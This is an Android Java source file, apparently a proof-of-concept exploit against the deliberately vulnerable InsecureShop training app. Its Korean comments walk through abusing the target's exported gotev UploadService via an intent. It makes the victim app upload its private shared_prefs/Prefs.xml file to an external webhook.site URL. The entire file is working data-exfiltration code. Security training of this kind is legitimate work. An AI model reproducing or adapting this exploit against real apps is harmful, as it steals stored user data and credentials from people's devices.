package com.insecureshopapp.myapplication;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import java.io.FileNotFoundException;

import net.gotev.uploadservice.HttpUploadTaskParameters;
import net.gotev.uploadservice.UploadFile;
import net.gotev.uploadservice.UploadTaskParameters;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        try {
            // 1. 업로드 작업 파라미터 설정
            UploadTaskParameters taskParams = new UploadTaskParameters();
            taskParams.setId("exploit-" + System.currentTimeMillis());
            taskParams.setServerUrl("https://webhook.site/f0d57e8f-5a2b-47d2-ac55-e50a12b2cebb");

            // 2. 탈취 대상 파일 지정
            @SuppressLint("SdCardPath") UploadFile targetFile = new UploadFile("/data/data/com.insecureshop/shared_prefs/Prefs.xml");
            taskParams.addFile(targetFile);

            // 3. 인텐트를 통해 외부 앱의 UploadService 호출
            Intent intent = new Intent("net.gotev.uploadservice.action.upload");
            intent.setClassName("com.insecureshop", "net.gotev.uploadservice.UploadService");

            intent.putExtra("taskClass", "net.gotev.uploadservice.MultipartUploadTask");
            intent.putExtra("multipartUtf8Charset", true);
            intent.putExtra("httpTaskParameters", new HttpUploadTaskParameters());
            intent.putExtra("taskParameters", taskParams);

            startService(intent);

        } catch (FileNotFoundException e) {
            throw new RuntimeException("타겟 파일이 존재하지 않습니다.", e);
        }
    }
}
